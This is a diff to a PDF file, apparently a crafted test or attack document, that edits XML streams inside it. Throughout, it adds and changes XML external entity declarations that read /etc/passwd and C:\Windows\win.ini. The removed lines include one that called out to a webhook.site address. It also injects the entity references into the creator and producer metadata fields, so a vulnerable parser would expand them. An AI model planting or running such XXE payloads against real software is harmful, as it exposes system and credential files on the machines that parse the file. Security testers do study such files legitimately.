@@ -74,7 +74,7 @@ endobj
 >>
 stream
 <?xpacket begin="﻿" id="W5M0MpCehiHzreSzNTczkc9d"?>
-<!DOCTYPE foo [ <!ENTITY xxe2 SYSTEM "https://webhook.site/39a19d2a-d102-4cd4-8d37-1137126df3b5" > ]>
+<!DOCTYPE foo [ <!ENTITY xxe2 SYSTEM "file:///etc/passwd" > ]>
 <x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 4.0-c321 44.398116, Tue Aug 04 2009 14:24:39">
    <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
       <rdf:Description rdf:about=""
@@ -740,7 +740,7 @@ endobj
 >>
 stream
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://etc/passwd" > ]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:\Windows\win.ini" > ]>
 <xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
 endstream
 endobj
@@ -757,6 +757,7 @@ endobj
   /Length 17 0 R
 >>
 stream
+<!DOCTYPE foo [ <!ENTITY xxe3 SYSTEM "file://etc/passwd" > ]>
 <config xmlns="http://www.xfa.org/schema/xci/1.0/"
 ><agent name="designer"
 ><destination
@@ -781,9 +782,9 @@ stream
 ><version
 >1.65</version
 ><creator
->Adobe LiveCycle Designer 8.0</creator
+>Adobe LiveCycle Designer 8.0 &xxe2;</creator
 ><producer
->Adobe LiveCycle Designer 8.0</producer
+>Adobe LiveCycle Designer 8.0 &xxe;</producer
 ><scriptModel
 >XFA</scriptModel
 ><interactive
@@ -9571,7 +9572,7 @@ P
 
 
 					
-    															
+    															
 					
                 	
 
